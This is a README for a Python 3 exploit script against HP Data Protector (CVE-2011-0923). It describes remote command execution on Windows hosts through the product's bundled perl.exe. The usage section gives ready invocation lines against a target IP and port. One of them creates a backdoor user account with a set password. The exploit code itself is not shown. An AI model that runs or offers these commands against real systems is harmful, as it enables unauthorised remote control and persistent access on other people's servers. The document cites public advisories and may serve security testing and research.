# HP Data Protector Arbitrary Remote Command Execution

This script allows executing a command with an arbitrary number of arguments on the target system by using the 'perl.exe' interpreter installed with HP Data Protector within the `{install_path}/bin/` directory.

## Description

The main goal of this script is to bypass the limitation of executing only a single command without parameters, as provided by existing exploits. This exploit leverages a vulnerability in HP Data Protector to run any command on the target system.

## Target Operating Systems

- Microsoft Windows

## Tested Version

- HP Data Protector A.06.20

## Usage

```sh
python3 exploit.py <target> <port> <command>
python3 exploit.py 192.168.1.1 5555 'dir c:\'
python3 exploit.py 192.168.1.1 5555 'ipconfig /all'
python3 exploit.py 192.168.1.1 5555 'net user back-user b@ckUs3r!$ /ADD'
```
## Credits

- Alessandro Di Pinto (alessandro.dipinto@artificialstudios.org)
- Claudio Moletta (mclaudio@gmail.com)
- Adapted to Python 3 by Ian Lovering

## Notes

This script is based on the original exploit developed by Alessandro Di Pinto and Claudio Moletta. It has been adapted and updated to be functional in Python 3, ensuring compatibility with modern versions of Python.

## References

- [ZDI-11-055](http://www.zerodayinitiative.com/advisories/ZDI-11-055/)
- [CVE-2011-0923](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0923)
- [HP Document](http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143)
